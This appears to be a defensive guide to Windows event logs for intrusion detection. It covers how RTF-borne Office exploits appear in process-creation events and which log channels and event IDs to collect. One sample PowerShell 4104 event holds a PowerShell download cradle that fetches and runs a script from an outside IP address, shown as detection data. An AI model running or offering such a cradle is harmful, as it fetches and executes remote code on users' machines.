CVE What it abused How the RTF triggered it What you see on the endpoint CVE-2017-0199 Office's handling of an <code>OLE2Link</code> object pointing to a URL that returns an HTA <code>\objautlink</code> + <code>\objupdate</code>: Word fetched the remote document on open and ran it. No macro, no warning bar <code>WINWORD.EXE</code> → <code>mshta.exe</code> with a URL, then PowerShell/VBScript downloading the next stage CVE-2017-11882, CVE-2018-0802 Buffer overflows in the old Equation Editor (<code>EQNEDT32.EXE</code>) An <code>Equation.3</code> object in the RTF. Opening it started the vulnerable process <code>EQNEDT32.EXE</code> running at all (and spawning <code>cmd</code>/<code>powershell</code>). Microsoft removed Equation Editor in January 2018, but old builds and unpatched installs lingered for years CVE-2017-8570 Another OLE moniker path similar to 0199, used to drop a scriptlet Embedded object with a crafted moniker Script host (<code>wscript</code>, <code>cscript</code>, <code>mshta</code>) as a child of Word CVE-2023-21716 Heap corruption in Word's RTF parser (font table handling) Just parsing the file. Even the Outlook preview pane was enough Word or Outlook crashing or spawning children. Patched February 2023 <p>The common pattern is that the document only has to be opened or previewed. That's ATT&amp;CK T1203 Exploitation for Client Execution, usually delivered by T1566.001 Spearphishing Attachment and relying on T1204.002 User Execution: Malicious File for the first click. In investigations, the endpoint side is often clearer than the file. Here's what the CVE-2017-0199 chain looks like in a process-creation event (4688, "A new process has been created". It fires every time a process starts, and attackers care because it records what ran, with what command line, and started by whom; see process creation events):</p> <pre><code>&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"&gt;
  &lt;System&gt;
    &lt;EventID&gt;4688&lt;/EventID&gt;
    &lt;TimeCreated SystemTime="2026-11-24T02:13:48.0912254Z" /&gt;
    &lt;Computer&gt;HR-WS-0042.corp.example&lt;/Computer&gt;
  &lt;/System&gt;
  &lt;EventData&gt;
    &lt;Data Name="SubjectUserName"&gt;s.park&lt;/Data&gt;
    &lt;Data Name="NewProcessName"&gt;C:\Windows\System32\mshta.exe&lt;/Data&gt;
    &lt;Data Name="CommandLine"&gt;C:\Windows\System32\mshta.exe -Embedding&lt;/Data&gt;
    &lt;Data Name="ParentProcessName"&gt;C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE&lt;/Data&gt;
    &lt;Data Name="TokenElevationType"&gt;%%1938&lt;/Data&gt;
  &lt;/EventData&gt;
&lt;/Event&gt;
</code></pre> <ul> <li><code>NewProcessName …mshta.exe</code>: the Windows HTML Application host. It runs HTA files (HTML plus script with full user rights), T1218.005 Mshta.</li> <li><code>CommandLine mshta.exe -Embedding</code>: <code>-Embedding</code> means it was started by COM/OLE on behalf of another program. The HTA it fetched isn't in the command line. Look at the network logs for Word's or mshta's HTTP request right before this.</li> <li><code>ParentProcessName …WINWORD.EXE</code>: Word started it. Word has almost no legitimate reason to start <code>mshta.exe</code>. This parent-child pair is the detection.</li> <li><code>TokenElevationType %%1938</code>: a limited token, normal user rights. The exploit didn't need admin.</li> </ul>

Channel (as shown by <code>Get-WinEvent -ListLog</code>) What is recorded Key event IDs Notes <code>Security</code> Audit events: logons, process creation, accounts, groups, Kerberos, object access, policy changes 4624/4625, 4688, 4672, 4720, 4728/4732, 4768/4769, 4719, 1102 Depends entirely on the audit policy <code>System</code> OS and service events 7045 (service installed), 7036/7040, 104 (log cleared), 6005/6006 Many providers in one channel <code>Application</code> Application events 1000/1001 (crash), app-specific Mixed quality; legacy EMET wrote here <code>Microsoft-Windows-PowerShell/Operational</code> Pipeline execution, script blocks 4103, 4104, 4105/4106 Needs logging enabled by policy <code>Microsoft-Windows-Security-Mitigations/KernelMode</code> and <code>/UserMode</code> Exploit-protection blocks and audits IDs differ per mitigation (block vs audit) Very valuable when it fires <code>Microsoft-Windows-CodeIntegrity/Operational</code> App Control for Business (WDAC) and driver/image signing decisions 3076 (audit), 3077 (block), 3033/3063 (signing level) Use audit mode as a sensor <code>Microsoft-Windows-AppLocker/EXE and DLL</code>, <code>/MSI and Script</code>, <code>/Packaged app-Execution</code>, <code>/Packaged app-Deployment</code> AppLocker allow/audit/block 8002–8007 (and packaged-app IDs) One channel per rule collection <code>Microsoft-Windows-Windows Defender/Operational</code> Antivirus detections, actions, tampering 1116/1117, 1006/1007, 5001, 5007, 5013 Essential if you don't get Defender alerts centrally <code>Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</code> Firewall rule and profile changes 2004/2005/2006 (older builds), 2097 and others (newer builds) Noisy; filter to changes <code>Microsoft-Windows-Sysmon/Operational</code> Sysmon telemetry 1, 3, 7, 8, 10, 11, 12–14, 22 … If Sysmon is deployed, always collect <p>Now the reasoning behind each one.</p> <p>PowerShell/Operational — the most important channel after Security. Many attacks run entirely in PowerShell, often in memory, downloading code and running it without ever writing an executable to disk. The Security channel sees at most "<code>powershell.exe</code> started" (4688), maybe with an encoded command line. The PowerShell channel, with script block logging turned on, records the code itself — after decoding:</p> <pre><code>&lt;System&gt;
  &lt;Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /&gt;
  &lt;EventID&gt;4104&lt;/EventID&gt;
  &lt;Level&gt;5&lt;/Level&gt;
  &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt;
  &lt;Computer&gt;WS-FIN-0217.corp.example&lt;/Computer&gt;
  &lt;Security UserID="S-1-5-21-1004336348-1177238915-682003330-1871" /&gt;
&lt;/System&gt;
&lt;EventData&gt;
  &lt;Data Name="MessageNumber"&gt;1&lt;/Data&gt;
  &lt;Data Name="MessageTotal"&gt;1&lt;/Data&gt;
  &lt;Data Name="ScriptBlockText"&gt;IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/s.ps1')&lt;/Data&gt;
  &lt;Data Name="ScriptBlockId"&gt;7d0b3f6e-2c41-4a8e-b1f9-0e5a6c2d9b13&lt;/Data&gt;
  &lt;Data Name="Path"&gt;&lt;/Data&gt;
&lt;/EventData&gt;
</code></pre> <ul> <li><code>Provider Microsoft-Windows-PowerShell</code>, <code>EventID 4104</code> — "Creating Scriptblock text": PowerShell logs each block of code it compiles. It fires when script block logging is enabled by policy; PowerShell also logs suspicious-looking blocks as warnings even without the policy, but you shouldn't rely on that.</li> <li><code>Level 5</code> (Verbose) for normal blocks; suspicious ones are logged at <code>Level 3</code> (Warning) — a handy filter.</li> <li><code>&lt;Security UserID="…-1871" /&gt;</code> — here the System section's <code>Security</code> field is filled: the SID of the user whose PowerShell ran the code.</li> <li><code>MessageNumber 1</code> / <code>MessageTotal 1</code> — long scripts are split over several events; join them by <code>ScriptBlockId</code>.</li> <li><code>ScriptBlockText</code> — the code itself. This line is a classic download cradle: fetch a script from <code>203.0.113.45</code> and run it in memory with <code>IEX</code> (Invoke-Expression). MITRE ATT&amp;CK T1059.001 (PowerShell) and T1105 (Ingress Tool Transfer). Even if the attacker had launched it as <code>powershell -enc SQBFAFgA…</code>, 4104 shows the decoded text.</li> <li><code>Path</code> empty — the code was typed or passed on the command line, not loaded from a <code>.ps1</code> file.</li> </ul> <p>4103 (module logging) records each command run with its parameters; 4105/4106 mark script start/stop when enabled. The details of PowerShell logging belong to the important-events section; what matters here is that without this channel, a whole class of attacks is invisible, and many organisations still don't have it enabled. (See also PowerShell download cradles.) PowerShell 7 logs to its own channel, <code>PowerShellCore/Operational</code>, so collect both if both are installed.</p> <p>Security-Mitigations (KernelMode and UserMode). This is where Windows' exploit protection (formerly Exploit Guard, and before that the separate EMET tool which wrote to the Application channel) records when a mitigation such as arbitrary-code-guard or a ROP check blocked or audited something. A block here usually means someone tried to exploit a program on this machine (T1203 Exploitation for Client Execution) — high value, low volume. Related Defender features (attack surface reduction, controlled folder access, network protection) record their blocks in the Defender channel. The point is the same either way: prevention should also be detection. If a control silently stops an attack and nobody looks, you've missed the attacker's next attempt, which might work.</p> <p>CodeIntegrity/Operational. App Control for Business (formerly WDAC) writes its decisions here: 3076 = "would have been blocked" (audit mode), 3077 = blocked (enforce mode), plus events about policy activation and about drivers and images that fail signing requirements. Attackers loading an unsigned or vulnerable driver (BYOVD, often for disabling EDR — T1562.001) or a payload from a user-writable folder show up here.</p> <p>AppLocker (several channels). One channel per rule collection — <code>EXE and DLL</code>, <code>MSI and Script</code>, <code>Packaged app-Execution</code>, <code>Packaged app-Deployment</code>. 8002/8003/8004 = allowed / audited ("would have been blocked") / blocked for EXE and DLL; 8005/8006/8007 the same for scripts and MSI. As with every application control, a block is both a prevention and a signal that something tried to run where it shouldn't (see Application Control, FIM and Catching Persistence).</p> <p>Windows Defender/Operational. The built-in antivirus logs detections (1116 detected, 1117 action taken, 1006/1007 for older-style detections) and configuration and health changes (5001 real-time protection disabled, 5007 configuration changed — e.g. an exclusion added, 5013 tamper protection blocked a change). If your Defender alerts reach you through a central console (Microsoft Defender for Endpoint or a management product), this channel is a backup; if not, it's your only antivirus visibility. Tampering events matter most: an attacker disabling real-time protection or adding <code>C:\Users\Public\</code> as an exclusion (T1562.001) is preparing to drop something.</p> <p>Windows Firewall With Advanced Security/Firewall. Records when firewall rules or profiles change. The same changes can also appear in Security (4946–4950) when the audit subcategory "MPSSVC Rule-Level Policy Change" is enabled. Attackers add allow rules for their tools or turn profiles off (T1562.004). The channel is noisy — applications add and update rules all the time — so filter to rules added by unexpected processes or to profile changes. [Changed] On recent Windows 11 builds the event IDs for rule changes in this channel differ from older builds (for example 2097 where older builds used 2004), so check provider + ID on your own build before writing the filter.</p> <p>Sysmon/Operational. If Sysmon is installed, collecting its channel is the whole point of installing it: process creation with hashes and parent command line (1), network connections per process (3), image loads (7), remote thread creation (8), process access such as opening LSASS (10), file creation (11), registry changes (12–14), DNS queries per process (22) and more.</p> <p>[Supplement] Channels that matter in real intrusions but are often forgotten:</p> Channel Why Key event IDs <code>Microsoft-Windows-TaskScheduler/Operational</code> Scheduled-task persistence and execution (T1053.005) 106 (registered), 140 (updated), 141 (deleted), 200/201 (action started/completed) <code>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</code> RDP session logon/reconnect/disconnect with source IP (T1021.001) 21, 24, 25 <code>Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational</code> RDP network connection accepted, before logon 1149 <code>Microsoft-Windows-WMI-Activity/Operational</code> WMI permanent event subscriptions — fileless persistence (T1546.003) 5861 <code>Microsoft-Windows-Bits-Client/Operational</code> BITS jobs used to download or persist (T1197) 3, 59, 60
